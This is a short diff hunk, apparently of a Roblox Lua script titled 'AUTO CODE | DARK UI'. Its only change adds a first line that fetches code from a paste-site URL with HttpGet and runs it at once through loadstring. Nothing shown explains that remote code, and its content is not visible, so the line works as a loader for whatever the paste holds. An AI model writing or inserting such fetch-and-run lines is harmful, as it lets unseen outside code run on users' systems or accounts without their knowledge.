@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/l1U3QXpr/raw"))() 
 
 --==================================================
 -- AUTO CODE | DARK UI
